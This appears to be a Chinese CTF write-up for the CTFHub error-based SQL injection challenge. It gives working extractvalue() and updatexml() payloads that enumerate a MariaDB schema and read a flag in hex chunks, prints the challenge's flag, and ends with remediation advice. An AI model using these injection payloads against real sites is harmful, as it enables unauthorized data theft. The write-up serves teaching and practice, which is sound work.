CTFHub - Web - SQL注入 - 报错注入

# CTFHub # Web # SQL注入 # 报错注入 # extractvalue # MariaDB

一、题目信息

  • 题目名称：报错注入
  • 题目方向：Web - SQL注入
  • 题目环境：动态分配的 HTTP 服务地址
  • 题目目标：通过 SQL 报错信息逐步读取数据库名、表名和字段值，最终获取 flag。

二、判断注入点

页面提供 id 查询参数，并直接回显服务端执行的 SQL 语句。提交 id=1 时显示：

select * from news where id=1
查询正确

参数直接拼接在 id= 后，没有单引号包裹，属于整数型注入点。提交单引号可以触发 SQL 语法错误：

select * from news where id=1'

查询错误: You have an error in your SQL syntax; check the manual that
corresponds to your MariaDB server version for the right syntax to use
near ''' at line 1

响应同时泄露了数据库类型为 MariaDB，这为使用 extractvalue() 或 updatexml() 构造报错注入提供了条件。

三、验证报错注入

在查询后追加 and extractvalue()，并让第二个参数包含以 ~ 包裹的待读取内容。由于参数不是合法的 XPath 表达式，错误信息会回显拼接后的内容：

id=1 and extractvalue(1,concat(0x7e,database(),0x7e))

页面返回：

XPATH syntax error: '~sqli~'

可以确认当前数据库为 sqli，并且注入结果能够通过 XPATH 错误信息直接回显。等价的 updatexml() payload 也可以得到相同结果：

id=1 and updatexml(1,concat(0x7e,database(),0x7e),1)

四、枚举表名

通过 information_schema.tables 查询当前数据库中的表名，并使用 group_concat() 将结果合并为一个字符串：

id=1 and extractvalue(1,concat(0x7e,
  (select group_concat(table_name)
   from information_schema.tables
   where table_schema=database()),0x7e))

服务端返回：

XPATH syntax error: '~flag,news~'

目标表为 flag。

五、枚举字段名

查询 flag 表的字段。这里使用十六进制值 0x666c6167 表示字符串 flag，避免额外的引号处理：

id=1 and extractvalue(1,concat(0x7e,
  (select group_concat(column_name)
   from information_schema.columns
   where table_schema=database()
   and table_name=0x666c6167),0x7e))

页面返回字段名：

XPATH syntax error: '~flag~'

六、分段读取 Flag

直接读取 flag 字段时，错误信息最多只能稳定回显约 32 个字符。为避免内容被截断，先将字段值转换为十六进制，再使用 substr() 分段读取。

读取第 1 至 30 个十六进制字符：

id=1 and extractvalue(1,concat(0x7e,
  substr(hex((select flag from flag limit 1)),1,30),0x7e))
6374666875627B6666383464376562

读取第 31 至 60 个字符：

id=1 and extractvalue(1,concat(0x7e,
  substr(hex((select flag from flag limit 1)),31,30),0x7e))
366438316435303831366433663736

读取第 61 个字符开始的内容：

id=1 and extractvalue(1,concat(0x7e,
  substr(hex((select flag from flag limit 1)),61,30),0x7e))
387D

拼接后得到完整的十六进制字符串：

6374666875627B6666383464376562366438316435303831366433663736387D

使用 length() 验证原 flag 长度为 32，转换后的十六进制长度应为 64；解码上述十六进制字符串即可得到 flag。

七、最终 Flag

ctfhub{ff84d7eb6d81d50816d3f768}

八、修复建议

  • 使用预处理语句和参数绑定，禁止把用户输入直接拼接进 SQL 语句。
  • 对 id 等参数执行严格的数据类型校验，只允许合法的整数输入。
  • 关闭生产环境中的详细数据库错误回显，统一返回通用错误页面。
  • 数据库账号遵循最小权限原则，限制对 information_schema 和业务表的访问能力。

九、解题总结

本题的核心是构造 XPATH 错误，让数据库把目标查询结果写入错误信息并回显。extractvalue() 和 updatexml() 都可用于此类注入；当报错信息存在长度限制时，可以先将结果转为十六进制，再通过 substr() 分段提取。实际开发中应使用参数化查询并从生产环境移除详细数据库错误。
